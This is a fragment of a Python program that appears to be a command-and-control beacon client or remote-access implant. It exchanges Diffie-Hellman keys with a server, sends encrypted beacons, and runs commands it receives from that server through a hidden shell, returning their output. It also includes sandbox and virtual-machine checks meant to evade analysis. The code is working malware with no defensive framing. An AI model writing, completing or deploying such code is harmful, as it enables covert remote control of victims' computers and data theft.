}

# Key Rotation Interval (in seconds)
KEY_ROTATION_INTERVAL = 3600
last_key_fetch = 0

# Initialize Fernet (initially with None key)
fernet = None

def generate_dh_parameters():
    parameters = dh.generate_parameters(generator=2, key_size=2048)
    return parameters

def generate_dh_private_key(parameters):
    private_key = parameters.generate_private_key()
    return private_key

def generate_dh_public_key(private_key):
    public_key = private_key.public_key()
    return public_key

def perform_key_exchange():
    """Performs Diffie-Hellman key exchange with the server."""
    parameters = generate_dh_parameters()
    client_private_key = generate_dh_private_key(parameters)
    client_public_key = generate_dh_public_key(client_private_key)

    # Serialize parameters and client public key
    serialized_parameters = parameters.parameter_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.ParameterFormat.PKCS3,
    )
    serialized_client_public_key = client_public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )

    try:
        response = requests.post(
            f"{CONFIG['server_url']}/key_exchange",
            json={
                "client_public_key": serialized_client_public_key.decode(),
                "parameters": serialized_parameters.decode(),
            },
            verify=CONFIG["ca_bundle_path"],
        )

        if response.status_code == 200:
            server_public_key_pem = response.json()["server_public_key"].encode()
            server_public_key = serialization.load_pem_public_key(
                server_public_key_pem, backend=default_backend()
            )

            shared_key = client_private_key.exchange(server_public_key)

            derived_key = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None, 
                info=b"beacon-encryption-key",
            ).derive(shared_key)

            return derived_key
        else:
            print(f"Key exchange failed: {response.status_code}")
            return None

    except RequestException as e:
        print(f"Error during key exchange: {e}")
        return None

def get_encryption_key(jwt_token):
    """Retrieves the encryption key from the server."""
    try:
        response = requests.get(f"{CONFIG['server_url']}/encryption_key", headers={
            "Authorization": f"Bearer {jwt_token}"
        }, verify=CONFIG["ca_bundle_path"])
        if response.status_code == 200:
            return base64.b64decode(response.json()["key"])
        else:
            print(f"Failed to get encryption key: {response.status_code}")
            return None
    except RequestException as e:
        print(f"Error during encryption key retrieval: {e}")
        return None

def get_jwt_token():
    """Authenticates with the server and retrieves a JWT token."""
    try:
        response = requests.post(f"{CONFIG['server_url']}/login", json={
            "username": CONFIG["username"],
            "password": CONFIG["password"]
        }, verify=CONFIG["ca_bundle_path"])
        if response.status_code == 200:
            return response.json()["access_token"]
        else:
            print(f"Authentication failed: {response.status_code}")
            return None
    except RequestException as e:
        print(f"Error during authentication: {e}")
        return None

def send_beacon(data, jwt_token):
    """Sends beacon data to the server."""
    data["client_id"] = CONFIG["client_id"]

    try:
        encrypted_data = fernet.encrypt(json.dumps(data).encode())
        response = requests.post(f"{CONFIG['server_url']}/beacon/", headers={
            "Content-Type": "application/octet-stream",
            "Authorization": f"Bearer {jwt_token}"
        }, data=encrypted_data, verify=CONFIG["ca_bundle_path"])

        if response.status_code == 200:
            process_command(response, jwt_token)
        else:
            print(f"Beacon not acknowledged: {response.status_code}")
    except RequestException as e:
        print(f"Error sending beacon: {e}")

def process_command(response, jwt_token):
    """Processes commands received from the server."""
    try:
        encrypted_command = response.content
        command = fernet.decrypt(encrypted_command).decode() if encrypted_command else ""
        if command:
            execute_command_and_report(command, jwt_token)
    except InvalidToken:
        print("Error: Invalid encryption key or corrupted data.")
    except Exception as e:
        print(f"Error processing command: {e}")

def execute_command_and_report(command, jwt_token):
    """Executes a command and reports the output back to the server."""
    if not isinstance(command, str) or not command.strip():
        return

    if is_sandbox():
        print("Sandbox environment detected. Command execution skipped.")
        return

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        report_command_output(command, output, jwt_token, status="success")
    except subprocess.CalledProcessError as e:
        report_command_output(command, e.output, jwt_token, status="failed")

def report_command_output(command, output, jwt_token, status="success"):
    """Sends the output of a command back to the server."""
    data = {
        "client_id": CONFIG["client_id"],
        "command": command,
        "output": output,
        "status": status
    }
    try:
        encrypted_data = fernet.encrypt(json.dumps(data).encode())
        response = requests.post(f"{CONFIG['server_url']}/command_output/", headers={
            "Content-Type": "application/octet-stream",
            "Authorization": f"Bearer {jwt_token}"
        }, data=encrypted_data, verify=CONFIG["ca_bundle_path"])
        if response.status_code != 200:
            print(f"Failed to report command output: {response.status_code}")
    except RequestException as e:
        print(f"Error reporting command output: {e}")

def is_sandbox():
    """Performs basic sandbox detection."""
    if 'SANDBOX' in os.environ:
        return True

    virtualbox_files = ["VBoxGuestAdditions.iso", "VBoxControl.exe"]
    for file in virtualbox_files:
        if os.path.exists(file):
            return True

    virtualization_platforms = ["virtualbox", "vmware", "qemu", "xen"]
    current_platform = platform.system().lower()
    for platform_name in virtualization_platforms:
        if platform_name in current_platform:
            return True

    return False

